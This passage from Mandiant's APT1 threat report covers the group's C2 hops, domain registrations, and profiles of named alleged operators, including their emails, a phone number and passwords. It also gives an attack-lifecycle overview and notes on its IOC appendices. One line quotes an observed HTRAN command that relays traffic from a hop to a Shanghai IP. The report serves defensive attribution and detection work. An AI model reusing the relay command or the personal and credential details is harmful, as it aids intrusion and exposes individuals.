APT1 actor, will listen for incoming connections on port 443 on the hop and automatically proxy them to the Shanghai
IP address 58.247.242.254 on port 443:

        htran -tran 443 58.247.242.254 443

In the 767 observed uses of HTRAN, APT1 intruders supplied 614 distinct routable IP addresses.In other words, they
used their hops to function as middlemen between victim systems and 614 different addresses.In these instances they do not need to use a proxy tool like
HTRAN to interact with victim systems.However, it does mean that the intruders need to be able to interface with the
(often graphical) C2 server software running on the hop.We have observed APT1 intruders log in to their hop point,
start the C2 server, wait for incoming connections, and then proceed to give commands to victim systems.WEBC2 variants may include a server component that provides a simple C2 interface to the intruder.This saves the
intruder from having to manually edit webpages.That is, this server component receives connections from victim
backdoors, displays them to the intruder, and then translates the intruder’s commands into HTML tags that the victim
backdoors read.</section>


<footer>
Mandiant APT1	                                              42	                                         www.mandiant.com
</footer>

<section>
<heading>APT1 Servers</heading>
In the last two years alone, we have confirmed 937 APT1 C2 servers — that is, actively listening or communicating
programs — running on 849 distinct IP addresses.However, we have evidence to suggest that APT1 is running
hundreds, and likely thousands, of other servers (see the Domains section below).The programs acting as APT1
servers have mainly been: (1) FTP, for transferring files; (2) web, primarily for WEBC2; (3) RDP, for remote graphical
control of a system; (4) HTRAN, for proxying; and (5) C2 servers associated with various backdoor families (covered in
Appendix C: The Malware Arsenal).In the same way that people program named
contacts into their cell phones and no longer need to remember phone numbers, DNS allows people to remember
names like “google.com” instead of IP addresses.When a person types “google.com” into a web browser, a DNS
translation to an IP address occurs so that the person’s computer can communicate with Google.Names that can be
translated through DNS to IP addresses are referred to as Fully Qualified Domain Names (FQDNs).The FQDNs play an important role in their intrusion campaigns because APT1 embeds FQDNs as C2 addresses within their backdoors.In the last several years we have confirmed 2,551 FQDNs attributed to APT1.Of these, we have redacted FQDNs that implicated victims by name and provided 2,046 in Appendix D. By using FQDNs rather than hard-coded IP addresses as C2 addresses, attackers may dynamically decide where to direct C2 connections from a given backdoor.That is, if they lose control of a specific hop point (IP address) they can “point” the C2 FQDN address to a different IP address and resume their control over victim backdoors.This flexibility allows the attacker to direct victim systems to myriad C2 servers and avoid being blocked.APT1 FQDNs can be grouped into three categories: (1) registered zones, (2) third-party zones, and (3) hijacked domains.Registered Zones
A DNS zone represents a collection of FQDNs that end with the same name, and which are usually registered through a domain registration company and controlled by a single owner.For example, “hugesoft.org” is an FQDN but also represents a zone.The FQDNs “ug-co.hugesoft.org” and “7cback.hugesoft.org” are part of the “hugesoft.org” zone and are called “subdomains” of the zone.The person who registered “hugesoft.org” may add as many subdomains as they wish and controls the IP resolutions of these FQDNs.APT1 has registered at least 107 zones since 2004.Within these zones, we know of thousands of FQDNs that have resolved to hundreds of IP addresses (which we suspect are hops) and in some instances to APT1’s source IP addresses in Shanghai.The first zone we became aware of was “hugesoft.org”, which was registered through eNom, Inc. in October 2004.The registrant supplied “uglygorilla@163.com” as an email address.For
example, “shanghai” is not a street name.Nevertheless, it is noteworthy that Shanghai appeared in the first known
APT1 domain registration, along with a phone number that begins with China’s “+86” international code.In fact,
Shanghai was listed as the registrant’s city in at least 24 of the 107 (22%) registrations.For example, consider the registration information
supplied for the zone “uszzcs.com” in 2005:

	         Victor etejedaa@yahoo.com +86.8005439436
	         Michael Murphy
	         795 Livermore St.
	         Yellow Spring,Ohio,UNITED STATES 45387

Here, a phone number with a Chinese prefix (“+86”) accompanied an address in the United States.Since the United
States uses the prefix “+1”, it is highly unlikely that a person living in Ohio would provide a phone number beginning
with “+86”.Additionally, the city name is spelled incorrectly, as it should be “Yellow Springs” instead of “Yellow
Spring”.This could have been attributed to a one-time spelling mistake, except the registrant spelled the city name
incorrectly multiple times, both for the zones “uszzcs.com” and “attnpower.com”.This suggests that the registrant
really thought “Yellow Spring” was the correct spelling and that he or she did not, in fact, live or work in Yellow Springs,
Ohio.Overall, the combination of a relatively high number of “Shanghai” registrations with obviously false registration
examples in other registrations suggests a partially uncoordinated domain registration campaign from 2004 until
present, in which some registrants tried to fabricate non-Shanghai locations but others did not.This is supported by
contextual information on the Internet for the email address “lfengg@163.com,” which was supplied in the registration
information for seven of the 107 zones.On the site “www.china-one.org,” the email address “lfengg@163.com”
appears as the contact for the Shanghai Kai Optical Information Technology Co., Ltd., a website production company
located in a part of Shanghai that is across the river from PLA Unit 61398.<figure></figure>


<caption>Figure 25: An email address used to register APT1 zones is also a contact for a Shanghai company</caption>

</section>

<footer>
Mandiant APT1	                                              47	                                          www.mandiant.com
</footer>

<section>
<heading>Naming Themes</heading>
About half of APT1’s known zones were named according to three themes: news, technology and business.These
themes cause APT1 command and control addresses to appear benign at first glance.However, we believe that the
hundreds of FQDNs within these zones were created for the purpose of APT1 intrusions.(Note: these themes are not
unique to APT1 or even APT in general.)The news-themed zones include the names of well-known news media outlets such as CNN, Yahoo and Reuters.However, they also include names referencing English-speaking countries, such as “aunewsonline.com” (Australia),
“canadatvsite.com” (Canada), and “todayusa.org” (U.S.).The names suggest websites that professionals might visit:
<table>
advanbusiness.com                           companyinfosite.com                              infobusinessus.org
businessconsults.net                        conferencesinfo.com                              jobsadvanced.com
businessformars.com                         copporationnews.com
</table>

Not every zone stays within APT1’s control forever.Over a campaign lasting for so many years, APT1 has not always
renewed every zone in their attack infrastructure.Additionally, while some have simply been allowed to expire,
others have been transferred to the organizations that the domain names attempted to imitate.For example, in
September 2011, Yahoo filed a complaint against “zheng youjun” of “Arizona, USA”, who registered the APT1
zone “myyahoonews.com”.<fn>37</fn> Yahoo alleged the “<myyahoonews.com> domain name was confusingly similar to
Complainant’s YAHOO!mark” and that “[zheng youjun] registered and used the <myyahoonews.com> domain name
in bad faith.” In response, the National Arbitration Forum found that the site “myyahoonews.com” at the time resolved

<footnote>
  Yahoo!Inc. v. Zheng National Arbitration Forum Claim Number: FA1109001409001, (October 31, 2011) (Tyrus R. Atkinson, Jr., panelist), http://
37	

domains.adrforum.com/domains/decisions/1409001.htm, accessed February 6, 2013.</footnote>

<footer>
Mandiant APT1	                                                        48	                                                 www.mandiant.com
</footer>

to “a phishing web page, substantially similar to the actual WorldSID website...in an effort to collect login credentials
under false pretenses.” Not surprisingly, “zheng youjun” did not respond.Subsequently, control of “myyahoonews.com” was transferred from APT1 to Yahoo.</section>

<section>
<heading>Third-Party Services</heading>
The third-party service that APT1 has used the most is known as “dynamic DNS.” This is a service that allows people
to register subdomains under zones that other people have registered and provided to the service.Over the years,
APT1 has registered hundreds of FQDNs in this manner.When they need to change the IP resolution of an FQDN, they
simply log in to these services and update the IP resolution of their FQDN via a web-based interface.In addition to dynamic DNS, recently we have observed that APT1 has been creating FQDNs that end with
“appspot.com”, suggesting that they are using Google’s App Engine service.</section>

<section>
<heading>Hijacked FQDNs</heading>
APT1 intruders often use the FQDNs that are associated with legitimate websites hosted by their hop points.We
consider these domains to be “hijacked” because they were registered by someone for a legitimate reason, but have
been leveraged by APT1 for malicious purposes.APT1 uses hijacked FQDNs for two main purposes.First, they
place malware (usually in ZIP files) on the legitimate websites hosted on the hop point and then send spear phishing
emails with a link that includes the legitimate FQDN.Second, they embed hijacked FQDNs as C2 addresses in their
backdoors.Evidence of a Vast Infrastructure
As noted above, we have confirmed the existence of 937 servers (listening applications) hosted on 849 distinct IP
addresses, with the majority of IP addresses registered to organizations in China (709), followed by the U.S. (109).In the last three years we have observed APT1 FQDNs resolving to 988 unique IP addresses that we believe are not
“sinkhole”<fn>38</fn> or “domain parking”<fn>39</fn> IP addresses:
»»    United States: 559
»»    China: 263
»»    Taiwan: 25
»»    Korea: 22
»»    United Kingdom: 14
»»    Canada: 12
»»    Other: 83



<footnote>
38	
   A sinkhole is a server that accepts redirected connections for known malicious domains.Attempted connections to C2 FQDNs are redirected to
sinkholes once malicious zones are re-registered by research organizations or security companies in coordination with registration companies.39	
   Some IP addresses are used for “domain parking” once the original registrant loses control of a zone or otherwise-registered FQDN, e.g., when
the zone expires.These IP addresses usually host advertisements.Additionally, although we know of over 2,500 APT1 FQDNs, there are
many APT1 FQDNs that we have not attributed to APT1, which have resolved to even more IP addresses.We estimate
(conservatively) that APT1’s current hop infrastructure includes over 1,000 servers.</section>


<footer>
Mandiant APT1	                                          50	                                       www.mandiant.com
</footer>
 
<section>
    <heading>APT1 : Identities</heading>

APT1 is not a ghost in a digital machine.In our effort to underscore that there are actual individuals tasked by the
PLA behind APT1’s keyboards, we have decided to expose the identities of a select number of APT1 personas.These
actors have made poor operational security choices, facilitating our research and allowing us to track their activities.They are some of the authors of APT1’s digital weapons and the registrants of APT1 FQDNs and email accounts.These
actors have expressed interest in China’s cyber warfare efforts, disclosed their locations to be the Pudong New Area
of Shanghai, and have even used a Shanghai mobile phone number to register email accounts used in spear phishing
campaigns.Methods for attributing APT personnel often involve the synthesis of many small pieces of information into a singular
comprehensive picture.Often this unified viewpoint reveals not only the group attribution, but coherent pockets
of behavior within the group which we perceive to be either small teams or individual actors.We refer to these as
“personas.” As APT1 personas manage technical resources such as hops and Fully Qualified Domain Names (FQDNs),
they have been observed to de-conflict their actions amongst themselves by coordinating the use of specific hops,
FQDNs, CNO tools (e.g., malware) and ports.One additional element working in our favor as threat trackers is the Great Firewall of China (GFWoC).Like many
Chinese hackers, APT1 attackers do not like to be constrained by the strict rules put in place by the Communist Party
of China (CPC), which deployed the GFWoC as a censorship measure to restrict access to web sites such as google.com, facebook.com, and twitter.com.Additionally, the nature of the hackers’ work requires them to have control of
network infrastructure outside the GFWoC.This creates a situation where the easiest way for them to log into Facebook
and Twitter is directly from their attack infrastructure.Once noticed, this is an effective way to discover their real
identities.</section>

<section>
                        What is the Great Firewall of China?The “Great Firewall” is a term used to describe the various technical methods used by the
                         Chinese government to censor and block or restrict access to Internet services and content
                         that the government considers sensitive or inappropriate.“Inappropriate” content ranges
                         from pornography to political dissent, and from social media to news sites that may portray
    China or Chinese officials in a negative light.The “Great Firewall” uses methods such as blocking particular
    IP addresses; blocking or redirecting specific domain names; filtering or blocking any URL containing target
    keywords; and rate-limiting or resetting TCP connections.Chinese censors also routinely monitor Chinese
    websites, blogs, and social media for “inappropriate” content, removing it when found.As a result, Chinese
    citizens who wish to access censored content must resort to workarounds such as the use of encryption.China continues to improve and further restrict Internet access, most recently (in December 2012) by blocking
    additional services and limiting or blocking the use of encryption technologies such as Virtual Private Networks.</section>


<footer>
Mandiant APT1	                                             51	                                        www.mandiant.com
</footer>

<section>
<heading>APT1 Hacker Profile: Ugly Gorilla (Wang Dong/汪东)</heading>
The story of “Ugly Gorilla” (UG) dates back to 2004.A then-professor named Zhang Zhaozhong (张召
忠), now a retired rear admiral, was in the process
of helping to shape the future of China’s information
warfare strategy.<fn>40</fn> Professor Zhang was already a
strong advocate for the “informationization” of military
units, and had published several works on military
strategy including “Network Warfare” (网络战争) and
“Winning the Information War” (打赢信息化战争).As
Director of the “Military Technology and Equipment”
(军事科技与装备) department at China’s National
Defense University (国防大学), professor Zhang was
invited to take part in an event titled “Outlook 2004:
The International Strategic Situation” in January 2004.During the online question and answer session
hosted by the PLA Daily’s (解放军报) China Military
Online (中国军网), one young man with the nickname                          
“Greenfield” (绿野) posed a particularly prescient                       
question.<figure></figure>

<caption>Figure 26: Professor Zhang (张召忠) 16 Jan 2004,
           source http://www.chinamil.com.cn/site1/gflt/2004-09/30/content_705216.htm</caption>



                      “Professor Zhang, I read your book ’Network Warfare‘ and was deeply impressed
                      by the views and arguments in the book.It is said that the U.S. military has set up
                      a dedicated network force referred to as a ‘cyber army.’ Does China have a similar
                      force?Does China have cyber troops?”
                                                                               — UglyGorilla 16 Jan 2004


Like all users of the China Military Online (chinamil) forums, “Greenfield” was required to sign up with an email
address and specify a small bit of information about himself.Thankfully, the Internet’s tendency to immortalize data
preserved the profile details for us.In addition to his email address, UG listed his “real
name” as “JackWang”.Within the year, we saw the first evidence of UG honing the tools of his trade.On October 25, 2004, UG registered the
now infamous “hugesoft.org” zone.The “hugesoft.org” zone and its many APT1-attributed hostnames have remained
active and under the continuous ownership of UG, and are still active as of the time of this report.Registration
information was most recently updated on September 10, 2012, extending the registration period for the zone well into
2013.We may see UG relinquish this and other attributed zones as a result of this reporting, in an effort to deter further
tracking and attribution.In 2007, UG authored the
first known sample of the
MANITSME family of malware                             
and, like a good artist, left his                      
clearly identifiable signature in                      
the code: “v1.0 No Doubt to
                                                       
Hack You, Writed by UglyGorilla,
                                                       
06/29/2007”[sic].UG’s
tendency to sign his work is                           
present in the strings he chooses                       
for hostnames and even within                           
the communications protocols
his backdoors use.For example,

<box>
What is a meat chicken?!?UG’s consistent use of the username “UglyGorilla” across various Web accounts has left a thin but strong thread of
attribution through many online communities.In most instances, content such as hacking tools, information security
topics, and association with the Shanghai locality are reasonable ways to eliminate false positives.For example, in
February of 2011, the disclosure of all registered “rootkit.com” accounts published by Anonymous included the user
“uglygorilla” with the registered email address uglygorilla@163.com.This is the same email used to register for the
2004 PLA forum and the zone hugesoft.org.Included in the rootkit.com leaked account information was the IP address
58.246.255.28, which was used to register UG’s account directly from the previously discussed APT1 home range:
58.246.0.0/15.In a few of these accounts, UG has listed something other than “JackWang” as his real name.On February 2, 2006, a
user named “uglygorilla” uploaded a file named “mailbomb_1.08.zip” (a bulk email tool) to the Chinese developer site
PUDN (www.pudn.com).His account details from PUDN included the real name “Wang Dong” (汪东).<figure></figure>

<caption>Figure 29: Wang Dong’s Uploaded Files to pudn.com</caption>

It is important to note two things at this point.First, Chinese names begin with the surname.So “Wang” is the last
name in 汪东.Second, it is a fairly common practice for the Chinese, even in China, to choose an English first name.Thus “JackWang” may not have been an alias at all.</section>


<footer>
Mandiant APT1	                                            55	                                       www.mandiant.com
</footer>

<section>
<heading>APT1 Hacker Profile: DOTA</heading>
Another APT1 persona is “dota” (DOTA), named for his strong tendency to use variants of that name in almost all
accounts he creates and uses from his attack infrastructure.DOTA may have taken his name from the video game
“Defense of the Ancients” which is commonly abbreviated DotA, though we have yet to observe any direct link or other
direct reference to the game.We have monitored the creation of dozens of accounts, including d0ta010@hotmail.com and dota.d013@gmail.com,
and have often seen DOTA create several sequential accounts (for example dota.d001 through dota.d015) at web-
based email services.Most often these accounts are used in social engineering and phishing attacks or as the contact
email address when signing up for other services.For example, DOTA (originating from the APT1 home range IP
address 58.247.26.59) with a Simplified Chinese keyboard setting used the email address “d0ta001@hotmail.com”
from his US hop to register the Facebook user “do.ta.5011”(Facebook user id: 100002184628208).Some services, such as Google’s Gmail, require users to provide a phone number during the registration process to
which they send a validation “text message” containing a verification code.The user must then input the verification
code on the website to finalize registration.In an observed session on a compromised machine, DOTA used the phone
number “159-2193-7229” to receive a verification text message from Google, which he then submitted to their page
within seconds.Telephone numbers in China are organized into a hierarchy containing an area code, prefix, and line number similar
to phone numbers in the United States, with the addition that a few area codes are allocated for use by mobile phone
providers.The phone number “159-2193-7229” breaks down into the “159” area code, which indicates a mobile
phone provided by China Mobile, and the prefix “2193”, which indicates a Shanghai mobile number.This means at the
very least that the number was initially allocated by China Mobile for use in Shanghai.The speed of DOTA’s response
also indicates that he had the phone with him at the time.We have also observed DOTA using the names Rodney
and Raith to communicate via email in fluent English               
with various targets including South East Asian military           
organizations in Malaysia and the Philippines.It is unclear       
if this Gmail account is used exclusively for facilitating his     
CNO mission, but much of the traffic indicates its use in          
both simple phishing attacks, as well as more sophisticated        
email based social engineering.<box>
The DOTA persona also appears to be a
fan of the popular “Harry Potter” character,
frequently setting accounts “security
questions” such as “Who is your favorite
teacher?” and “Who is your best childhood
friend?” to the values “Harry” and “Poter”
and creating accounts such as poter.spo1@gmail.com with the alternate email address set to
dota.sb005@gmail.com.</box>
<footer>
Mandiant APT1	                                               56	                                    www.mandiant.com
</footer>


<figure></figure>
<caption>Figure 30: dota.d001@gmail.com (inbox view)<fn>41</fn></caption>

When creating dozens, or hundreds, of accounts in online communities and on victim systems, password management
becomes a significant undertaking.Consequently, most APT1 attackers use passwords that are either pattern-based,
such as the keyboard pattern “1qaz2wsx” or highly memorable, using “rootkit” as a password on the information
security research site rootkit.com.Like many APT1 attackers, DOTA frequently uses keyboard based patterns as
passwords such as “1qaz@WSX#EDC”.However, there is one password “2j3c1k” extensively used by DOTA that is not
based on a keyboard pattern, though he may not be the only APT1 actor that uses it.A numbered “j”, followed by a
numbered “c”, and then a numbered “k” is likely shorthand (“j”/”c”/”k”) for the ju/chu/ke (局／处／科) organizational
structure (translated to Bureau/Division (or Office)/Section) widely used within PLA General Staff Department
organizations.Project 2049 describes the typical PLA organizational structure as, “Bureau-level directors … oversee
between six and 14 subordinate sites or offices [chu; 处]… Sites/offices under bureaus are further divided into sections



<footnote>
41	
      This is a screen capture of DOTA accessing his Gmail account while using a compromised system on APT1’s attack infrastructure.</footnote>

<footer>
Mandiant APT1	                                                            57	                                                 www.mandiant.com
</footer>

[ke; 科].<fn>42</fn> Given this pattern, it is likely that the password “2j3c1k” stands for 2nd Bureau [Unit 61398], 3rd Division,
1st Section, demonstrating that those who use these patterns are working together and affiliate themselves to the 2nd
Bureau.Attempting to track the DOTA persona back to a particular individual is difficult; the trail of his activity does not link
as clearly to a real world identity.However, Mandiant has been able to establish a clear link between UG and DOTA.Specifically, we have observed the two using shared APT1 infrastructure, FQDNs, and egress IP address ranges.The
coordination of this shared infrastructure, combined with their close proximity and association with Unit 61398 makes
it highly likely that, at the very least, UG and DOTA know each other personally and likely even work together.</section>

<section>
APT1 Hacker Profile: SuperHard (Mei Qiang/梅强)
The third and final persona we are revealing has been dubbed “SuperHard” (SH).SH was first observed as a tool
author, and is either the creator or a significant contributor to the AURIGA and BANGAT malware families (covered
in Appendix C: The Malware Arsenal).Similarly to UG, SH signs much of his work by embedding strings within the
tools.In particular, elements of the portable executable (PE) file’s VS_VERSIONINFO structure are frequently set to
“SuperHard,” or cmd.exe copies are modified from “Microsoft corp.” to “superhard corp.”

Additionally, many of SH’s tools contain driver modules designed to be loaded into the Windows kernel in order to
subvert elements of the system.While not unique for APT1 coders, this level of development expertise is certainly
a discriminator that puts SH into a smaller group of highly capable developers within APT1.Often, SH’s tools are
observed in use by other APT1 personae and in several instances, other APT groups we track.Given that SH’s tools
are used by other APT1 actors, and that there are no indications that SH is a full-time operator, we believe that SH is
primarily involved in research and development for APT1.Once again, in tracking SH we are fortunate to have access to the accounts disclosed from rootkit.com.The rootkit.com account “SuperHard_M” was originally registered from the IP address 58.247.237.4, within one of the known
APT1 egress ranges, and using the email address “mei_qiang_82@sohu.com”.We have observed the DOTA persona
emailing someone with the username mei_qiang_82.The name “Mei Qiang” (梅强) is a reasonably common Chinese
last/first name combination.Additionally, it is a common practice for Chinese netizens to append the last two digits of
their birth year, suggesting that SuperHard is in fact Mei Qiang and was born in 1982.Unfortunately, there are several
“Mei Qiang” identities online that claim a birth year of 1982, making attribution to an individual difficult.Fortunately, we can use SH’s email address to connect him to a number of Websites and forums on which he
registered and contributed using that address.Many of these accounts reveal details that reinforce SH’s link to the
“mei_qiang_82@sohu.com”<fn>43</fn> email address and APT1 affiliation, such as SH offering to write Trojans for money, his
involvement with malicious Windows kernel research (incidentally, also commented on by “greenfield”, possibly UG),
and more recently, being local to Shanghai’s Pudong New Area.<fn>44</fn>

</section>
<footnote>

42	
   Mark A. Stokes, Jenny Lin, and L.C.Russell Hsiao, “The Chinese People’s Liberation Army Signals Intelligence and Cyber Reconnaissance
Infrastructure,” Project 2049 Institute (2011): 6-7, http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf,
accessed February 6, 2013.43	
      Sohu.com is a popular Chinese search engine, webmail, and Internet advertising company based out of Beijing China.44	
      hxxp://tuziw.com/index.php?m=ta&id=1864863532
</footnote>

<footer>
Mandiant APT1	                                                           58	                                                 www.mandiant.com
</footer>

<section>
    <heading>Conclusion</heading>

In a State that rigorously monitors Internet use, it is highly unlikely that the Chinese Government is unaware of an
attack group that operates from the Pudong New Area of Shanghai.The detection and awareness of APT1 is made
even more probable by the sheer scale and sustainment of attacks that we have observed and documented in this
report.Therefore the most probable conclusion is that APT1 is able to wage such a long-running and extensive cyber
espionage campaign because it is acting with the full knowledge and cooperation of the government.Given the
mission, resourcing, and location of PLA Unit 61398, we conclude that PLA Unit 61398 is APT1.Table 12 summarizes
the parallels between APT1 and PLA Unit 61398.Or

         APT1 is Unit 61398.</section>


<footer>
Mandiant APT1	                                               60	                                         www.mandiant.com
</footer>
                         
<section>
    <heading>       Appendix A:
                  How Does Mandiant
          Distinguish Threat Groups ?</heading>

Mandiant uses the term threat group to refer to a collection of intruders who are working together to target and
penetrate networks of interest.These individuals may share the same set of tasks, coordinate their targets, and
share tools and methodology.They work together to gain access to their targets and steal data.Therefore, a group is
ultimately defined by people and not by methodology.However, defining a threat group based on observed intrusion activity is not so simple.Without seeing who is sitting
behind the keyboard it may be difficult to determine whether two different intrusion events were conducted by the
same person, by two people who are working together, by two unrelated people who independently compromised the
same network, or even the same computer.Different groups may use similar intrusion methodology and common tools,
particularly those that are widely available on the Internet, such as pwdump, HTRAN, or Gh0st RAT.Furthermore, there
may be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing
of personnel.Individual intruders may move between groups either temporarily or permanently.An intruder may be a
private citizen who is hired by multiple groups.Finally, multiple groups may work together on occasion to compromise
the same target.Nevertheless, distinguishing one threat group from another is possible with enough information, analytical experience,
and the technological tools to piece it all together.Consider an analogy with the physical world: imagine a thief who
leaves behind traces of his crime at various crime scenes.<footer>
Mandiant APT1	                                              61	                                         www.mandiant.com
</footer>

Forensic scientists can analyze multiple crime scenes and be able to tell by the evidence left behind that a given crime
scene was the result of one thief and not another.In a similar way, cyber intruders leave behind various digital “fingerprints.” They may send spear-phishing emails from
a specific IP address or email address.Their emails may contain certain patterns of subject lines.Their files have
specific names, MD5 hashes, timestamps, custom functions, and encryption algorithms.Their backdoors may have
command and control IP addresses or domain names embedded.These are just a few examples of the myriad of
linkages that computer forensic analysts consider when trying to distinguish one cyber threat group from another.Digital “fingerprints” do not all carry equal weight in attribution analysis.Their validity or value as indicators of a specific
threat group depends largely on their likelihood of uniqueness.For example, the use of a widely available tool such as
HTRAN is not unique and not useful — by itself — as an indicator of a specific threat group.In contrast, the use of
a specific, custom backdoor not observed elsewhere is a much stronger indicator — although it is generally still not
sufficient, on its own, for positive attribution.At the most basic level, we say that two intrusion events are attributed to the same group when we have collected
enough indicators to show beyond a reasonable doubt that the same person or group of people were involved.</section>

<footer>
Mandiant APT1	                                                 62	                                           www.mandiant.com
</footer>

<section>
    <heading>      Appendix B :
           APT and the Attack Lifecycle</heading>

While most computer intrusions follow a generic, high-level series of steps in the attack lifecycle, the Chinese APT
lifecycle differs slightly because of their unique long-term objectives.The sections below correspond to the stages
of Mandiant’s Attack Lifecycle model and give an overview of what APT activity looks like in each stage.The stages
between “Establish Foothold” and “Complete Mission” do not have to occur in this order every time.In fact, once
established within a network, APT groups will continually repeat the cycle of conducting reconnaissance, identifying
data of interest, moving laterally to access that data, and “completing mission” by stealing the data.This will generally
continue indefinitely until they are removed entirely from the network.</section>

<section>
<heading>Initial Compromise</heading>
The Initial Compromise stage represents the methods that intruders use to penetrate a target organization’s network.APT intruders frequently target individual users within a victim environment.As such, the most commonly observed
method of initial compromise is spear phishing.Spear phishing messages may contain malicious attachments, a link to
a malicious file, or a link to a malicious website.Less commonly, APT intruders may attempt to contact potential victims
and send malicious content via social networking sites or instant messaging.Another common tactic is strategic web
compromise, in which the attacker places malicious code on websites that people in targeted organizations will likely
visit.When they visit these websites in the course of their normal duties, they will be compromised if their computer
is vulnerable to the attacker’s exploit code.APT groups may also look for vulnerable Internet-facing web servers and
upload webshells in order to gain access to a targets internal network, or look for other technical vulnerabilities in
public-facing infrastructure.</section>

<section>
<heading>Establish Foothold</heading>
Establishing a foothold ensures that APT threat groups can access and control one or more computers within the
victim organization from outside the network.APT groups can utilize public backdoors (Gh0st RAT and Poison Ivy are
common examples), “underground” backdoors found in hacker websites or obtained through personal connections,
and “custom” backdoors that they developed themselves.These backdoors usually establish an outbound connection
from the victim network to a computer controlled by the attackers.The communication methods used by the backdoors
vary from clear text or simple encoding to the use of more advanced encoding or encryption.The backdoors will give
the APT groups basic access to a system, typically through a command shell or graphical user interface.</section>


<footer>
Mandiant APT1	                                              63	                                          www.mandiant.com
</footer>

<section>
<heading>Escalate Privileges</heading>
Escalating privileges involves acquiring items that will allow access to more resources within the victim environment.Most often this consists of obtaining usernames and passwords, but it may also include gaining access to PKI
certificates, VPN client software, privileged computers, or other resources required to access data or systems of
interest.APT intruders (and intruders in general) prefer to leverage privileged accounts where possible, such as
Domain Administrators, service accounts with Domain privileges, local Administrator accounts, and privileged user
accounts.This is typically accomplished by first “dumping” password hashes from a computer, server, or (preferably)
Domain Controller.The attacker may be able to obtain legitimate account passwords by “cracking” password hashes.Alternately, the attacker may leverage the hashes themselves in a “pass-the-hash” attack, where the hashed password
itself may be used for authentication in lieu of the actual password.A number of publicly available tools can be readily
leveraged for both password dumping and pass-the-hash attacks.</section>

<section>
<heading>Internal Reconnaissance</heading>
In the Internal Reconnaissance stage, the intruder collects information about the victim environment.APT threat
actors use built-in operating system commands (such as the Windows “net” commands) to obtain information about
the internal network, including computers, trust relationships, users, and groups.In order to identify data of interest,
they may perform directory or network share listings, or search for data by file extension, key word, or last modified
date.Data of interest may take many forms, but most commonly consists of documents, the contents of user email
accounts, or databases.Therefore file servers, email servers, and domain controllers are customary targets of internal
reconnaissance.Some APT groups utilize custom scripts in order to automate the process of reconnaissance and
identification of data of interest.</section>

<section>
<heading>Move Laterally</heading>
In most cases, the systems that the intruders initially compromise do not contain the data that they want.Therefore
they must move laterally within a network to other computers that either contain that data or allow them to access it.APT groups leverage compromised user credentials or pass-the-hash tools to gain access to additional computers and
devices inside of a victim network.They commonly use compromised credentials with PsExec and / or the Windows
Task Scheduler (“at” command) to execute commands and install malware on remote systems.</section>

<section>
<heading>Maintain Presence</heading>
In this stage, the intruders take actions to ensure continued control over key systems in the network environment from
outside of the network.APT groups often install new backdoors (e.g., different backdoors than the ones installed in the
Establish Foothold phase) in the environment during the course of the campaign.They may install different families of
malware on multiple computers and use a variety of command and control addresses, presumably for redundancy and
to make it difficult to identify and remove all of their access points.Additionally, APT groups may establish methods of
network access that do not involve backdoors, so that they can maintain a presence even if network security personnel
discover and remove their malware.These methods may include the use of valid PKI or VPN credentials, allowing the
intruders to masquerade as a legitimate user to gain access to a corporate network and internal resources.In some
instances APT threat actors have been able to circumvent two-factor authentication to maintain access to a victim
network and its resources.</section>


<footer>
Mandiant APT1	                                              64	                                         www.mandiant.com
</footer>

<section>
<heading>Complete Mission</heading>
The main goal of APT intrusions is to steal data, including intellectual property, business contracts or negotiations,
policy papers or internal memoranda.Once APT groups find files of interest on compromised systems, they often pack
them into archive files before stealing them.They most commonly use the RAR archiving utility for this task, but may
also use other publicly available utilities such as ZIP or 7-ZIP.APT threat actors not only compress data, but frequently
password-protect the archive.From there they use a variety of methods to transfer files out of the victim network,
including FTP, custom file transfer tools, or existing backdoors.</section>

<footer>
Mandiant APT1	                                              65	                                         www.mandiant.com
</footer>

<section>
    <heading>        Appendix C (Digital):
                      The Malware Arsenal</heading>

This appendix is digital and can be found at http://www.mandiant.com/apt1.It includes profiles of malware families that
APT1 has used.</section>

<footer>
Mandiant APT1	                                            66	                                        www.mandiant.com
</footer>

<section>
    <heading>        Appendix D (Digital):
                                FQDNs</heading>

This appendix is digital and can be found accompanying this report.It includes fully qualified domain names (FQDNs)
that APT1 has used as part of their attack infrastructure.</section>

<footer>
Mandiant APT1	                                           67	                                       www.mandiant.com
</footer>

<section>
    <heading>            Appendix E (Digital):
                            MD5 Hashes</heading>

This appendix is digital and can be found at http://www.mandiant.com/apt1.It includes MD5 hashes of malware that
APT1 has used as part of their attack methodology.In Appendix G: IOCs, the IOC named 8dd23e0a-a659-45b4-a168-
67e4b00944fb.ioc contains all of the MD5 hashes provided in this appendix for use in conjunction with Redline™,
Mandiant’s free host-based investigative tool, or with Mandiant Intelligent Response® (MIR), Mandiant’s commercal
host-based investigative tool.</section>

<footer>
Mandiant APT1	                                          68	                                      www.mandiant.com
</footer>

<section>
    <heading>         Appendix F (Digital):
                         SSL Certificates</heading>

This appendix is digital and can be found at http://www.mandiant.com/apt1.It includes APT1 SSL certificates used on
servers that are part of their command and control infrastructure.</section>


<footer>
Mandiant APT1	                                           69	                                       www.mandiant.com
</footer>
 
<section>
    <heading>                 Appendix G (Digital):
                                   IOCs</heading>

The portion of this appendix that includes the Indicators of Compromise (IOCs) is digital and can be found at http://
www.mandiant.com/apt1.</section>

<section>
<heading>APT1 Indicators and Using Redline™</heading>
With the release of Mandiant’s report, APT1: Exposing One of China’s Cyber Espionage Units, we are providing a set of
APT1 IOCs in the digital portion of Appendix G to help detect malware described in Appendix C: The Malware Arsenal.IOCs can be used in investigations to find unknown evils or for detection of already known threats.The IOCs included
in Appendix G fit the latter; however, keep in mind that APT1 does update their tools, and there are certainly malware
variants and new families of malware that will not be detected with this set of IOCs.To find out more about the report or
the digital appendices (to include downloading the set of APT1 IOCs in Appendix G: IOCs) go to http://www.mandiant.com/apt1.IOCs can be used in conjunction with Redline, Mandiant’s free host-based investigative tool, or with Mandiant
Intelligent Response® (MIR), Mandiant’s commercial host-based investigative tool.Mandiant’s customers who have
licensed MIR can simply import a zip file of the IOCs into their controllers.For those without MIR, Redline can be
downloaded from Mandiant’s web site at http://www.mandiant.com/resources/download/redline.Remember to always test new IOCs before using them in a production environment.</section>

<section>
<heading>What Are IOCs?</heading>
Mandiant has developed an open, extendable standard for defining and sharing threat information in a machine-
readable format.Going well beyond static signature analysis, IOCs combine over 500 types of forensic evidence with
grouping and logical operators to provide advanced threat detection capability.If you are not familiar with IOCs, go to the OpenIOC site for a description at http://openioc.org.</section>

<footer>
